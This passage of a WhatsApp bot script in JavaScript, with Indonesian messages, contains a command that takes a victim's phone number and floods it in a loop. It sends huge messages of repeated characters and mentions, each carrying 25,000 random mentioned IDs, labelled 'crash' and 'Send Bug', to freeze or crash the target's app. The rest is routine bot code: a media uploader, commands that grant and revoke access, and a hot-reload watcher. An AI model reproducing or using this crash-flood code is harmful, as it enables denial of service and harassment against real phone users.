        if (!q) {
          return vF3("Gunakan Comand Berikut " + v7 + " 628xxx");
        }
        let v76 = q.replace(/[^0-9]/g, "");
        if (v76.startsWith("0")) {
          return vF3("Gunakan Nomor Dengan Kode Negara");
        }
        let v77 = v76 + "@s.whatsapp.net";
        if (v77 === "6281911317205@s.whatsapp.net") {
          return vF3("Target Salah!!");
        }
        vF3("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜ホ\n> 𝙅𝙚𝙙𝙖 𝟩 𝙈𝙚𝙣𝙞𝙩 𝘽𝙞𝙖𝙧 𝙂𝙖 𝙆𝙚𝙣𝙤𝙣‼️ ");
        for (let v78 = 300; v78 < 500; v78++) {
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await p.relayMessage(v77, {
            extendedTextMessage: {
              text: "𝙑𝙞𝙣𝙘𝙚𝙣𝙩 𝙑𝟤" + "𓍯𓂃".repeat(79000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v77
            }
          });
          await p.relayMessage(v77, {
            extendedTextMessage: {
              text: "𝙑𝙞𝙣𝙘𝙚𝙣𝙩 𝙑𝟤" + "𓍯𓂃".repeat(80000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v77
            }
          });
          await p.relayMessage(v77, {
            extendedTextMessage: {
              text: "crash 🩸 " + "@6285929014979".repeat(70000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v77
            }
          });
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await p.relayMessage(v77, {
            extendedTextMessage: {
              text: "*VXREN*ꦾ" + "ꦾ".repeat(50000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v77
            }
          });
          await p.relayMessage(v77, {
            extendedTextMessage: {
              text: "ㅤ ㅤ ㅤ  " + "@6285929014979".repeat(70000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v77
            }
          });
          await p.relayMessage(v77, {
            extendedTextMessage: {
              text: "crash 🩸 " + "@6285929014979".repeat(70000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v77
            }
          });
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await p.relayMessage(v77, {
            extendedTextMessage: {
              text: "Hao " + "🎼〽️".repeat(50000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v77
            }
          });
          await p.relayMessage(v77, {
            extendedTextMessage: {
              text: "Halllo " + "@6285929014979".repeat(10000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v77
            }
          });
          await p.relayMessage(v77, {
            extendedTextMessage: {
              text: "crash 🩸 " + "@6285929014979".repeat(50000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v77
            }
          });
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
          await f5(v77, Ptcp = true);
        }
      }
  break;
  
  case "tourl": {

if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
if (!quoted) return m.reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
let q = m.quoted ? m.quoted : m
RenSenku.sendMessage(from, {
react: {
text: '🎁',
key: m.key
}
});
let media = await q.download()
let uploadImage = require('./serverside/libary/catmoe')
let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
let link = await (isTele ? uploadImage : uploadFile)(media)
m.reply(`Your Link : ${link}\nExpired Date : Undefined`)
}
 break;

    case "owner":
      {
        vF2(v6, owner, name, p2);
      }
      break;
    case "addacces":
      {
        if (!v11) {
          return vF3("*Khusus Owner [❗]");
        }
        if (!v8[0]) {
          return vF3("Penggunaan " + (v3 + v7) + " nomor\nContoh addacces " + (v3 + v7) + " 628577xxx/@tag");
        }
        yo = q.split("|")[0].replace(/[^0-9]/g, "");
        let v79 = await p.onWhatsApp(yo + "@s.whatsapp.net");
        if (v79.length == 0) {
          return vF3("Masukkin Nomor Yang Bener!!!!!");
        }
        p5.push(yo);
        fs2.writeFileSync("./database/List.json", JSON.stringify(p5));
        addakses = yo + "@s.whatsapp.net";
        f("*Sukses Diberi Akses📌*" + v7 + " @" + addakses.split("@")[0], [addakses]);
      }
      break;
    case "delacces":
      {
        if (!v11) {
          return vF3("*Khusus Owner [❗]*");
        }
        if (!v8[0]) {
          return vF3("Penggunaan " + (v3 + v7) + " nomor\ndelacces " + (v3 + v7) + " 628xxx/@tag");
        }
        ya = q.split("|")[0].replace(/[^0-9]/g, "");
        let v80 = await p.onWhatsApp(ya + "@s.whatsapp.net");
        if (v80.length == 0) {
          return vF3("Masukin Nomor Yang Benerr!!!");
        }
        unp = p5.indexOf(ya);
        p5.splice(unp, 1);
        fs2.writeFileSync("./database/List.json", JSON.stringify(p5));
        delakses = ya + "@s.whatsapp.net";
        f("*Sukses Diberi Akses📌*" + v7 + " @" + delakses.split("@")[0], [delakses]);
      }
      break;
    default:
  }
};
let v81 = require.resolve(__filename);
fs2.watchFile(v81, () => {
  fs2.unwatchFile(v81);
  console.log(chalk2.yellowBright("Update File Terbaru " + __filename));
  delete require.cache[v81];
  require(v81);
});